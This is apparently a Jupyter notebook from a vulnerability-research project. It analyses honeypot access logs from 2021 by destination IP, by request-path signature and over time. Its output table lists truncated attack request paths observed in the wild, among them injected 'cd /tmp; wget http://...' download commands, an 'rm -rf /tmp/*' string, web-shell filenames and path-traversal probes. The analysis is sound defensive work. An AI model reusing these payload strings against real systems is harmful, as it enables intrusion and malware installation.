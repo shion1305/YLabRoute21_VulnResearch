{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "c:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\elasticsearch\\connection\\base.py:200: ElasticsearchWarning: Elasticsearch built-in security features are not enabled. Without authentication, your cluster could be accessible to anyone. See https://www.elastic.co/guide/en/elasticsearch/reference/7.16/security-minimal-setup.html to enable security.\n",
      "  warnings.warn(message, category=ElasticsearchWarning)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Windows-10-10.0.22000-SP0\n",
      "Total size of data is... 17701\n"
     ]
    }
   ],
   "source": [
    "from DataCollector import importNotDetectData\n",
    "# Retrieve data from originData\n",
    "import platform\n",
    "\n",
    "data = importNotDetectData(2101, 2201)\n",
    "print(platform.platform())\n",
    "print('Total size of data is... %d' % len(data))"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "<hr>\n",
    "\n",
    "# destIPでの分類\n",
    "ハニーポットの総数は22個であることがわかった。\n",
    "\n",
    "not detectアクセスデータに関しては"
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Total Num of Variation in GeoIp: 22\n",
      "       IP       total\n",
      "104.238.185.103   303\n",
      " 157.245.204.40   155\n",
      "    3.6.183.235  1301\n",
      "  3.126.200.153  2179\n",
      "  44.227.53.230  5659\n",
      "155.138.134.102  1175\n",
      "   139.59.35.98   187\n",
      "  13.211.95.147  1121\n",
      " 13.113.114.211   210\n",
      "  199.247.11.85   191\n",
      " 13.209.159.235   408\n",
      "  45.32.119.106   192\n",
      " 18.229.242.225   929\n",
      " 15.185.134.185   171\n",
      "   13.49.30.108   302\n",
      " 52.213.219.192   348\n",
      " 18.162.103.211   190\n",
      "    45.32.28.50   238\n",
      "   52.74.78.244   950\n",
      " 165.22.204.232   268\n",
      "  133.34.169.17   327\n",
      "   103.81.85.89   897\n"
     ]
    }
   ],
   "source": [
    "# ここでは、destination_ipでデータを分類している。\n",
    "from DataGrouper import groupByDestIp\n",
    "\n",
    "# ipアドレスで仕分ける\n",
    "geoIps = groupByDestIp(data)\n",
    "# とりあえず結果を見てみたい\n",
    "print('Total Num of Variation in GeoIp: %d' % len(geoIps))\n",
    "print('IP'.center(15), \"total\")\n",
    "for ip, hit in geoIps.items():\n",
    "    print(str(ip).rjust(15), str(len(hit)).rjust(5))"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "# Signature ベースでの分類\n",
    "Signatureごとに仕分けた上で、\n",
    "\n",
    "受信IPにおいて同一IPからのアクセスがあるか確認したい\n",
    "(受信IPはdestination_ip)\n",
    "## 結果\n",
    "合計22のハニーポットが存在する中で、2つ以上で同じシグネチャーのアクセスが観測できれば、「流行している攻撃」と解釈することが可能であるが、\n",
    "\n",
    "非常に多くのnot detectedについて流行していることが確認された\n",
    "\n",
    "→既知のものが多く含まれている可能性が高い"
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "                    signature                      Spots Counts\n",
      "/goform/setUsbUnload/.js                              22   1117\n",
      "/pages/createpage-entervariables.action               22    458\n",
      "/backupmgt/localJob.php                               22    281\n",
      "/v1.40/containers/create                              22    256\n",
      "/                                                     21    203\n",
      "/include/makecvs.php                                  21     95\n",
      "/_config/query_servers/cmd                            21     79\n",
      "/body.txt                                             21     27\n",
      "/console/css/%252e%252e%252fconsole.portal            20     60\n",
      "/tools.cgi                                            20     41\n",
      "/checkValid                                           19    592\n",
      "/console/css/%252e%252e/consolejndi.portal            19     42\n",
      "/cgibin/mainfunction.cgi&action=login&keyPath=wget    19     19\n",
      "/cgibin/mainfunction.cgi&action=login&keyPath=wget    19     19\n",
      "/pages/doenterpagevariables.action                    18   3428\n",
      "/run                                                  18    603\n",
      "/console/css/%252e%252e%252fconsolejndi.portal        17    169\n",
      "/guest_auth/guestIsUp.php                             17     91\n",
      "/zhnping.cmd                                          17     33\n",
      "/live/CPEManager/AXCampaignManager/delete_cpes_by_    16     43\n",
      "/goform/SystemCommand                                 16     42\n",
      "/v1.26/containers/create                              16     33\n",
      "/cgibin/mainfunction.cgi&action=login&keyPath=wget    16     16\n",
      "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.ph    15    177\n",
      "/editBlackAndWhiteList                                15    132\n",
      "/AdminService/urest/v1/LogonResource                  15     40\n",
      "/getclock                                             15     22\n",
      "/dnslookup.cgi                                        15     15\n",
      "/core/vendor/phpunit/phpunit/src/Util/PHP/eval-std    14    164\n",
      "/storfs-asup                                          14    121\n",
      "/check_browser                                        14     22\n",
      "/q                                                    13    110\n",
      "/GponForm/diag_Form                                   13     37\n",
      "/api/getServices                                      13     35\n",
      "/users                                                12     64\n",
      "/formWlanSetup.htm                                    11     20\n",
      "/goform/setSysAdm                                     10    151\n",
      "/struts2-rest-showcase/orders/3                       10    148\n",
      "/shellcd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd    10     26\n",
      "/login                                                10     18\n",
      "//uapi-cgi/certmngr.cgi                                9    118\n",
      "/wsman                                                 9     22\n",
      "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd     9     13\n",
      "/login.htm                                             8    157\n",
      "/cgi/networkDiag.cgi                                   8    147\n",
      "/assets/php/upload.php                                 8    140\n",
      "/search.php                                            8    139\n",
      "/sys_config_valid.xgi                                  8     42\n",
      "/service/extdirect                                     8     17\n",
      "/apply.cgi                                             8     12\n",
      "/graph_realtime.php                                    7    146\n",
      "/mgmt/tm/util/bash                                     7     11\n",
      "/orders/3                                              6    143\n",
      "/jbossass/jbossass.jsp                                 6     43\n",
      "/tos/index.php                                         6      8\n",
      "/8UsA1.sh                                              6      8\n",
      "/rest/tinymce/1/macro/preview                          6      6\n",
      "/goform/setmac                                         5    142\n",
      "/cn/cmd                                                5     23\n",
      "/cgi                                                   5      9\n",
      "/shell&cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F195.13     5      6\n",
      "/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20wget%20http%3A     5      5\n",
      "/cgibin/mainfunction.cgi&action=login&keyPath=wget     5      5\n",
      "/shell%20                                              5      5\n",
      "/shell%00                                              5      5\n",
      "/var                                                   4    136\n",
      "/solr/%7B%7Bcore%7D%7D/select                          4    136\n",
      "/solr/%7B%7Bcore%7D%7D/dataimport                      4    130\n",
      "/upload                                                4    122\n",
      "/nrdh.php                                              4     17\n",
      "/wls-wsat/RegistrationPortTypeRPC                      4     14\n",
      "/new-index.php                                         4     14\n",
      "/wikindex.php                                          4     14\n",
      "/baindex.php                                           4     14\n",
      "/zindex.php                                            4     14\n",
      "/v1.23/containers/create                               4     12\n",
      "/_search                                               4     10\n",
      "/op_type=ping&destination=cd%20/tmp;%20wget%20http     4      7\n",
      "/boardDataWW.php                                       4      7\n",
      "/cgi-bin-igd/netcore_get.cgi                           4      6\n",
      "/cgibin/mainfunction.cgi&action=login&keyPath=wget     4      5\n",
      "/_cat/indices                                          4      4\n",
      "/include/exportUser.php                                4      4\n",
      "//console/css/%252e%252e%252fconsolejndi.portal        3     29\n",
      "/druid/indexer/v1/sampler                              3      5\n",
      "/password_change.cgi                                   3      4\n",
      "/sntpcfg.cgi                                           3      3\n",
      "/secure/ContactAdministrators.jspa                     3      3\n",
      "/restapps/applications.php                             3      3\n",
      "/v1.37/containers/create                               3      3\n",
      "/struts2-showcase/index.action                         3      3\n",
      "/v1.39/containers/create                               3      3\n",
      "/fuel/pages/select/                                    3      3\n",
      "/pandora_console/index.php                             2     37\n",
      "/_async/AsyncResponseService                           2     26\n",
      "/raidh.php                                             2      8\n",
      "/nette.micro                                           2      3\n",
      "/en/php/usb_sync.php                                   2      3\n",
      "/op_type=ping&destination=cd%20/tmp;%20wget%20http     2      2\n",
      "/cgibin/mainfunction.cgi&action=login&keyPath=wget     2      2\n",
      "/str/showcase.action                                   2      2\n",
      "/goform/formSysCmd                                     2      2\n",
      "/gbr.php                                               2      2\n",
      "/admin/cms/login.action                                2      2\n",
      "/portal/home.jsp                                       2      2\n",
      "/system/sharedir.php                                   2      2\n",
      "/auth/change                                           2      2\n",
      "/auth                                                  2      2\n",
      "/ping.cgi                                              1   5405\n",
      "/recordings/dmc.php                                    1      9\n",
      "/recordings/main.php                                   1      9\n",
      "/main.php                                              1      9\n",
      "/recordings/mcd.php                                    1      9\n",
      "/panel/main.php                                        1      9\n",
      "/recordings/cmd.php                                    1      9\n",
      "/actions/authenticate.php                              1      6\n",
      "/javax.faces.resource/dynamiccontent.properties.xh     1      6\n",
      "/restapi/config.all.php                                1      6\n",
      "/welcome/config.all.php                                1      6\n",
      "/meetme/config.all.php                                 1      6\n",
      "/restapps/config.all.php                               1      6\n",
      "/maint/config.all.php                                  1      6\n",
      "/themes/config.all.php                                 1      6\n",
      "/xx.php                                                1      6\n",
      "/config/config.all.php                                 1      6\n",
      "/recordingsconfig.all.php                              1      6\n",
      "/css/config.all.php                                    1      6\n",
      "/admin/libraries/config.all.php                        1      6\n",
      "/asteriskWS/config.all.php                             1      6\n",
      "/recordings/misc/config.all.php                        1      6\n",
      "/admin/views/config.all.php                            1      6\n",
      "/user/config.all.php                                   1      6\n",
      "/admin/modules/cxpanel/config.all.php                  1      6\n",
      "/bin/config.all.php                                    1      6\n",
      "/admin/themes/config.all.php                           1      6\n",
      "/nwebmail/config.all.php                               1      6\n",
      "/recordings/.3305b4a4dacef87aefc095a8dda66a8a.php      1      6\n",
      "/recordings.old/config.all.php                         1      6\n",
      "/config.all.php                                        1      6\n",
      "/api.php                                               1      6\n",
      "/panel/config.all.php                                  1      6\n",
      "/panel/dhtml/config.all.php                            1      6\n",
      "/widgets/config.all.php                                1      6\n",
      "/recordings/locale/bg_BG/LC_MESSAGES/config.all.ph     1      6\n",
      "/recordings/modules/config.all.php                     1      6\n",
      "/phpversions.php                                       1      6\n",
      "/components/config.all.php                             1      6\n",
      "/adminconfig.all.php                                   1      6\n",
      "/tests/config.all.php                                  1      6\n",
      "/libs/config.all.php                                   1      6\n",
      "/admin/images/config.all.php                           1      6\n",
      "/_asterisk/index.php                                   1      6\n",
      "/admin/common/config.all.php                           1      6\n",
      "/help/config.all.php                                   1      6\n",
      "/framework/config.all.php                              1      6\n",
      "/recordings/theme/config.all.php                       1      6\n",
      "/aastra/config.all.php                                 1      6\n",
      "/admin/helpers/config.all.php                          1      6\n",
      "/recordings/lol.php                                    1      6\n",
      "/STC_VoIP_PIN/config.all.php                           1      6\n",
      "/a2billing/common/lib/jpgraph_lib/config.all.php       1      6\n",
      "/controllers/config.all.php                            1      6\n",
      "/vtigercrm/z.php                                       1      6\n",
      "/admin/.3305b4a4dacef87aefc095a8dda66a8a.php           1      6\n",
      "/vtigercrm/phpversions.php                             1      6\n",
      "/admin/cdr/config.all.php                              1      6\n",
      "/recordings/config.all.php                             1      6\n",
      "/admin/modules/config.all.php                          1      6\n",
      "/recordings/.tika.php                                  1      6\n",
      "/panel/init/config.all.php                             1      6\n",
      "/mail/config.all.php                                   1      6\n",
      "/images/config.all.php                                 1      6\n",
      "/include/config.all.php                                1      6\n",
      "/a2billing/common/images/config.all.php                1      6\n",
      "/_asterisk/a7a.php                                     1      6\n",
      "/recordings/miscconfig.all.php                         1      6\n",
      "/var/config.all.php                                    1      6\n",
      "/panel/ming-source/config.all.php                      1      6\n",
      "/graph.php                                             1      6\n",
      "/recordings/graph.php                                  1      6\n",
      "/recordings/page.framework.php                         1      6\n",
      "/recordings/phpversions.php                            1      6\n",
      "/vtigercrm/graph.php                                   1      6\n",
      "/templates_c/config.all.php                            1      6\n",
      "/a2billing/common/lib/pqp/config.all.php               1      6\n",
      "/_asterisk/config.all.php                              1      6\n",
      "/recordings/locale/config.all.php                      1      6\n",
      "/temp/config.all.php                                   1      6\n",
      "/_asterisk/MeSSi.php                                   1      6\n",
      "/cisco/config.all.php                                  1      6\n",
      "/admin/i18n/config.all.php                             1      6\n",
      "/panel/flash/config.all.php                            1      6\n",
      "/admin/assets/config.all.php                           1      6\n",
      "/admin/modules/ucp/htdocs/config.all.php               1      6\n",
      "/recordings/s.php                                      1      6\n",
      "/k12/config.all.php                                    1      6\n",
      "/.3305b4a4dacef87aefc095a8dda66a8a.php                 1      6\n",
      "/vtigercrm/ml.php                                      1      6\n",
      "/web-meetme/config.all.php                             1      6\n",
      "/admin/config.all.php                                  1      6\n",
      "/a2billing/common/javascript/config.all.php            1      6\n",
      "/recordings/includes/config.all.php                    1      6\n",
      "/a2billing/config.all.php                              1      6\n",
      "/recordings/locale/bg_BG/config.all.php                1      6\n",
      "/lang/config.all.php                                   1      6\n",
      "/favicon.ico                                           1      6\n",
      "/elastixConnection/config.all.php                      1      5\n",
      "/modules/config.all.php                                1      5\n",
      "/classes/config.all.php                                1      5\n",
      "/mobrise/config.all.php                                1      5\n",
      "/js/config.all.php                                     1      5\n",
      "/configs/config.all.php                                1      5\n",
      "/digium_phones/config.all.php                          1      5\n",
      "/xmlservices/config.all.php                            1      5\n",
      "/yii/config.all.php                                    1      5\n",
      "/vtigercrm/config.all.php                              1      5\n",
      "/api/jsonws/invoke                                     1      4\n",
      "/login.cgi.php                                         1      3\n",
      "/var/tika.php                                          1      3\n",
      "/vtigercrm/saky.php                                    1      3\n",
      "/recordings/Ultimatex.php                              1      3\n",
      "/recordings/Hima.php                                   1      3\n",
      "/ssh.php                                               1      3\n",
      "/vtigercrm/xml.php                                     1      3\n",
      "/test.php                                              1      3\n",
      "/vtigercrm/Himaa.php                                   1      3\n",
      "/recordings/ops.php                                    1      3\n",
      "/wav.php                                               1      3\n",
      "/vtigercrm/a7a.php                                     1      3\n",
      "/recordings/emad-shell.php                             1      3\n",
      "/vtigercrm/3Zz.php                                     1      3\n",
      "/recordings/play_page.php                              1      3\n",
      "/recordings/emad.php                                   1      3\n",
      "/recordings/scan.php                                   1      3\n",
      "/panel/main.php.1                                      1      3\n",
      "/falx.php                                              1      3\n",
      "/admin/xml.php                                         1      3\n",
      "/recordings/info.php                                   1      3\n",
      "/vtigercrm/phprint.php                                 1      3\n",
      "/recordings/m2s.php                                    1      3\n",
      "/emad.php                                              1      3\n",
      "/vtigercrm/zizo.php                                    1      3\n",
      "/main.php.2                                            1      3\n",
      "/vtigercrm/xXx-ELMAYET-xXx.php                         1      3\n",
      "/recordings/too.php                                    1      3\n",
      "/vtigercrm/AboSala7.php                                1      3\n",
      "/recordings/11.php                                     1      3\n",
      "/recordings/a7a.php                                    1      3\n",
      "/Z3R0-C00L.php                                         1      3\n",
      "/recordings/misc/thaer.php                             1      3\n",
      "/zz.php.call                                           1      3\n",
      "/recordings/theme/config.inc.php                       1      3\n",
      "/recordings/pow.php                                    1      3\n",
      "/recordings/a/config.php                               1      3\n",
      "/recordings/ec0ed5d0ec037dca5.php                      1      3\n",
      "/_asterisk/tika.php                                    1      3\n",
      "/recordings/ELMAYET/config.php                         1      3\n",
      "/system.php                                            1      3\n",
      "/recordings/b374k-2.8.php                              1      3\n",
      "/recordings/webadmin.php                               1      3\n",
      "/recordings/misc/                                      1      3\n",
      "/recordings/atmin/config.php                           1      3\n",
      "/panel/main.php.2                                      1      3\n",
      "/_asterisk/sos.php                                     1      3\n",
      "/assets/Xiii.php                                       1      3\n",
      "/main.php.1                                            1      3\n",
      "/0x4148.php.call                                       1      3\n",
      "/admin/fortest.php                                     1      3\n",
      "/recordings/3Zz.php                                    1      3\n",
      "/recordings/theme/new.php                              1      3\n",
      "/vtigercrm/Hima.php                                    1      3\n",
      "/vtigercrm/main.php                                    1      3\n",
      "/recordings/m7mood/config.php                          1      3\n",
      "/vtigercrm/xXx-mat.php                                 1      3\n",
      "/a2billing/ws.php                                      1      3\n",
      "/recordings/badr2.php                                  1      3\n",
      "/vamp.php                                              1      3\n",
      "/recordings/Go.php                                     1      3\n",
      "/_asterisk/Xiii.php                                    1      3\n",
      "/recordings/sall123.php                                1      3\n",
      "/Hima.php                                              1      3\n",
      "/recordings/awael/config.php                           1      3\n",
      "/recordings/theme/load.php                             1      3\n",
      "/vtigercrm/ops.php                                     1      3\n",
      "/x1.php                                                1      3\n",
      "/pew.php                                               1      3\n",
      "/panel/atmin/config.php                                1      3\n",
      "/recordings/Dead_Sec_Team/config.php                   1      3\n",
      "/recordings/main.php.1                                 1      3\n",
      "/recordings/Xiii.php                                   1      3\n",
      "/vtigercrm/moaz.php                                    1      3\n",
      "/recordings/a8a.php                                    1      3\n",
      "/Z3R0-C00l.php.call                                    1      3\n",
      "/11.php                                                1      3\n",
      "/var/mod_conf.php                                      1      3\n",
      "/dslvl.php                                             1      3\n",
      "/recordings/is/config.php                              1      3\n",
      "/recordings/xnxx/config.php                            1      3\n",
      "/webadmin.php                                          1      3\n",
      "/recordings/Hima_s.php                                 1      3\n",
      "/recordings/a7/config.php                              1      3\n",
      "/z.php                                                 1      3\n",
      "/Ahmed01126291919.php                                  1      3\n",
      "/admin/assets/Xiii.php                                 1      3\n",
      "/recordings/misc/callme_page.php                       1      3\n",
      "/vtigercrm/k4ijo.php                                   1      3\n",
      "/admin/modules/admindashboard/phpsysinfo/1.php         1      3\n",
      "/recordings/em7e/config.php                            1      3\n",
      "/recordings/jeep.php                                   1      3\n",
      "/recordings/just-emad.php                              1      3\n",
      "/vtigercrm/Go.php                                      1      3\n",
      "/x.php                                                 1      3\n",
      "/admin/bootstrap.inc.php                               1      3\n",
      "/panel/webadmin.php                                    1      3\n",
      "/_asterisk/253582e2ec168f76c0d4755668192ea4fdad110     1      3\n",
      "/445122A555.php                                        1      3\n",
      "/recordings/ini.php                                    1      3\n",
      "/var/config.php                                        1      3\n",
      "/admin/config.php                                      1      3\n",
      "/admin/modules/backup/page.backup.php                  1      3\n",
      "/recordings/shell-test.php                             1      3\n",
      "/_asterisk/V-E-M.php                                   1      3\n",
      "/dispatch.php                                          1      3\n",
      "/recordings/azoofo.php                                 1      3\n",
      "/admin/modules/admindashboard/phpsysinfo/common_ad     1      3\n",
      "/vtigercrm/11.php                                      1      3\n",
      "/sip.txt                                               1      3\n",
      "/panel/fortest.php                                     1      3\n",
      "/recordings/config.amportal.php                        1      3\n",
      "/admin/modules/admindashboard/phpsysinfo/ass.php       1      3\n",
      "/xml.php                                               1      3\n",
      "/atmin/config.php                                      1      3\n",
      "/recordings/SecureShell.php                            1      3\n",
      "/recordings/ELLYAAS/config.php                         1      3\n",
      "/recordings/mo/config.php                              1      3\n",
      "/recordings/pos.php                                    1      3\n",
      "/v1/agent/service/register                             1      2\n",
      "//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.p     1      2\n",
      "/edit/server/                                          1      2\n",
      "/tmui/login.jsp/..;/tmui/locallib/workplace/tmshCm     1      2\n",
      "/ajax/networking/get_netcfg.php                        1      2\n",
      "/recordings/main.php.2                                 1      2\n",
      "/bin/bash%20-c%20%22rm%20-rf%20/tmp/*;echo%20wget%     1      2\n",
      "/pingcmd.cmd                                           1      1\n",
      "/op_type=ping&destination=cd%20/tmp;%20wget%20http     1      1\n",
      "HTTP/1.1                                               1      1\n",
      "/vpns/portal/scripts/newbm.pl                          1      1\n",
      "/op_type=ping&destination=cd%20/tmp;%20wget%20http     1      1\n",
      "/index.php                                             1      1\n",
      "/shell%3Fcd%20%2Ftmp%3B%20echo%20%3ENiGGea%20%7C%7     1      1\n",
      "/shell%3Fcd%20%2Ftmp%3B%20echo%20%3ENiGGea%20%7C%7     1      1\n",
      "/v1.38/containers/create                               1      1\n",
      "/_config/query_servers/afhh                            1      1\n",
      "/incl/image_test.shtml                                 1      1\n",
      "/cgibin/mainfunction.cgi&action=login&keyPath=wget     1      1\n",
      "/system                                                1      1\n",
      "/setup.cgi%3Fnext_file%3Dnetgear.cfg%26todo%3Dsysc     1      1\n",
      "/service/v1/createUser                                 1      1\n",
      "/goform/formWsc                                        1      1\n",
      "/v1.35/containers/create                               1      1\n",
      "/_config/query_servers/hvkfnjff                        1      1\n",
      "/_config/query_servers/hqatiuy                         1      1\n",
      "/cgibin/mainfunction.cgi&action=login&keyPath=cd%2     1      1\n",
      "/cgibin/mainfunction.cgi&action=login&keyPath=cd%2     1      1\n",
      "/gbrgbr.php                                            1      1\n",
      "/.wgetrc                                               1      1\n",
      "/console/framework/skins/wlsconsole/images/%252e%2     1      1\n",
      "/images/..%2Fapply_abstract.cgi                        1      1\n",
      "/cd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd%20/;     1      1\n",
      "/GET%20/%20HTTP/1.1%20Host:%203.7.80.171%20Referer     1      1\n",
      "/QNAP_helpdesk.cgi                                     1      1\n"
     ]
    }
   ],
   "source": [
    "from DataGrouper import groupBySignature\n",
    "\n",
    "#ここでは、同じsignature内に同一のipからのアクセスがどれくらいあるか確認する。\n",
    "dataS = groupBySignature(data)\n",
    "# result1はsignatureごとに分類した上に同一destination_ipについて整理したもの\n",
    "result1 = {}\n",
    "for s, hits in dataS.items():\n",
    "    #それぞれのIPについて分類する。\n",
    "    resultIps = {}\n",
    "    for hit in hits:\n",
    "        if not hit['_source']['destination_ip'] in resultIps:\n",
    "            resultIps[hit['_source']['destination_ip']] = []\n",
    "        resultIps[hit['_source']['destination_ip']].append(hit)\n",
    "    # Signature s についての分類が完了\n",
    "    # データとして格納\n",
    "    result1[s] = resultIps\n",
    "# result1を並び変える。\n",
    "# len(x[1])refers to the size of the variation of destination_ip\n",
    "# ↑ if this value is bigger than 1, it means that it is prevalent\n",
    "result1 = sorted(result1.items(), key=lambda x: len(dataS[x[0]]), reverse=True)\n",
    "result1 = sorted(result1, key=lambda x: len(x[1]), reverse=True)\n",
    "# Print and Export result1 as \"signatures_by_num_destIP(1-10).csv\"\n",
    "f = open(\"resultData/signatures_by_num_destIP(1-10).csv\", \"wb\")\n",
    "# 書き出す項目について整理しておく\n",
    "print(\"signature\".center(50), \"Spots\", \"Counts\")\n",
    "f.write('Signature,Spots,Hits\\n'.encode('utf-8'))\n",
    "for s, r in result1:\n",
    "    print(s[:50].ljust(50), str(len(r)).rjust(5), str(len(dataS[s])).rjust(6))\n",
    "    b = (s + ',' + str(len(r)) + ',' + str(len(dataS[s])) + '\\n').encode('utf-8')\n",
    "    f.write(b)\n",
    "f.flush()\n",
    "f.close()"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "# データの整合性\n",
    "データの整合性について気になったので以下で確認してみた。\n",
    "\n",
    "not detectではポットからポット自身に送っているものはないというが、どこかで確認した気がする。\n",
    "## 結論\n",
    "\n",
    "not detectラベルがついたデータの中では、\n",
    "- source_ipとgeoip>ipは完全に一致\n",
    "- destination_ipとsource_ipが同じであるものは見つからなかった←(おそらくElasticSearchをいじっている中で同じものに出くわした覚えがあるのでこれについては追加で調査したい)"
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\n",
      "33\n",
      "Skipped. Folder 'Unknown' already exists in output\n"
     ]
    }
   ],
   "source": [
    "from DataOutputter import *\n",
    "import importlib\n",
    "\n",
    "result2 = []\n",
    "result3 = []\n",
    "for d in data:\n",
    "    if 'ip' in d['_source']['geoip']:\n",
    "        if not str(d['_source']['source_ip']) == str(d['_source']['geoip']['ip']):\n",
    "            result2.append(d)\n",
    "        if str(d['_source']['destination_ip']) == str(d['_source']['geoip']['ip']):\n",
    "            result2.append(d)\n",
    "    else:\n",
    "        result3.append(d)\n",
    "print(len(result2))\n",
    "print(len(result3))\n",
    "easyOutput(data=result3, folder='Unknown')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "# グラフ化\n",
    "以下のコードでは、7日ごとに全データを集計した。"
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "outputs": [],
   "source": [
    "from Grapher import *\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "plt.rcParams[\"figure.figsize\"] = [12, 3]\n",
    "starting = pd.to_datetime(\"2021/1/1 00:00:00\")\n",
    "ending = pd.to_datetime(\"2021/12/31 00:00:00\")\n",
    "visualizeTimeData(data, starting=starting.timestamp(), ending=ending.timestamp(), title='not detect 全データの期間分布(7日ごと)',\n",
    "                  loc=\"not detect 全データの期間分布\")"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "8.27から9.2までのデータが気になる..."
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "outputs": [],
   "source": [
    "starting = pd.to_datetime(\"2021/8/27 00:00:00\")\n",
    "ending = pd.to_datetime(\"2021/9/3 00:00:00\")\n",
    "visualizeTimeData(data, starting=starting.timestamp(), ending=ending.timestamp(), title='not detect 8.27~9.2の詳細(8時間ごと)',\n",
    "                  loc='8.27~9.2の調査',\n",
    "                  period=8 * 60 * 60, x_axis='hour')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "もう少し絞って見てみる"
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "outputs": [],
   "source": [
    "from Grapher import *\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "plt.rcParams[\"figure.figsize\"] = [8, 3]\n",
    "starting = pd.to_datetime(\"2021/8/30 8:00:00\")\n",
    "ending = pd.to_datetime(\"2021/8/31 16:00:00\")\n",
    "visualizeTimeData(records=data, starting=starting.timestamp(), ending=ending.timestamp(),\n",
    "                  title='not detect 8.30~8.31の詳細(1時間ごと)', loc='8.27~9.2の調査',\n",
    "                  period=1 * 60 * 60, x_axis='hour')"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "以下のコードではシグネチャーごとのデータの可視化を行っている。"
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "START\n",
      "COMPLETE\n",
      "START\n",
      "COMPLETE\n",
      "START\n",
      "COMPLETE\n",
      "START\n",
      "COMPLETE\n",
      "START\n",
      "COMPLETE\n",
      "START\n",
      "COMPLETE\n",
      "START\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001B[1;31m---------------------------------------------------------------------------\u001B[0m",
      "\u001B[1;31mKeyboardInterrupt\u001B[0m                         Traceback (most recent call last)",
      "\u001B[1;32m~\\AppData\\Local\\Temp/ipykernel_32044/1267083564.py\u001B[0m in \u001B[0;36m<module>\u001B[1;34m\u001B[0m\n\u001B[0;32m     16\u001B[0m         \u001B[0mplt\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mclose\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m     17\u001B[0m     \u001B[1;32mfor\u001B[0m \u001B[0ms\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0md\u001B[0m \u001B[1;32min\u001B[0m \u001B[0mdataS\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mitems\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m---> 18\u001B[1;33m         \u001B[0me\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0msubmit\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mtask\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0ms\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0md\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m",
